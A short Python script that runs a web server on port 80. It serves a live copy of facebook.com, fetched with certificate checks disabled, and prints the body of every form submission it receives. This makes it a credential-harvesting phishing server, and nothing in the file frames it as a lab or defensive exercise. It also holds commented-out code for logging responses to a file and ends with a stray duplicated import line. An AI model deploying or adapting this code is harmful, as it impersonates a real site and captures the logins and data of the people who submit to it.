import http.server
import socketserver
import urllib.request
import ssl
context = ssl._create_unverified_context()

class MyHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Download the website content
        #ip = "157.240.247.174"
        #url = 'https://spork.org'
        url = 'https://facebook.com'
            #"https://" + str(socket.gethostbyaddr(ip)[0])  # Replace with the desired website URL
        response = urllib.request.urlopen(url, context=context)
        content = response.read().decode('utf-8')

        # Send the downloaded content as the server response
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))
        #with open('user_responses.txt', 'a') as file:
         #   file.write(str(content))
          #  file.close()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        print(self.rfile.read(content_length).decode('utf-8'))

# Set up the server
PORT = 80  # Replace with the desired port number
Handler = MyHTTPRequestHandler




httpd = socketserver.TCPServer(("", PORT), Handler)
print("Server started at port", PORT)

try:
    httpd.serve_forever()
except KeyboardInterrupt:
    print("Shutting down KI")
    httpd.shutdown()
#try:
#    print("Test")
#print("Want to start server now")
#with socketserver.TCPServer(("", PORT), Handler) as httpd:
    #print("Server started at port", PORT)
    #httpd.serve_forever()
#except KeyboardInterrupt:

#    print("Keyboard interrupt received. Server shutting down.")
#finally:
#    print("Code is fucked")
#f.close()import ssl
context = ssl._create_unverified_context()
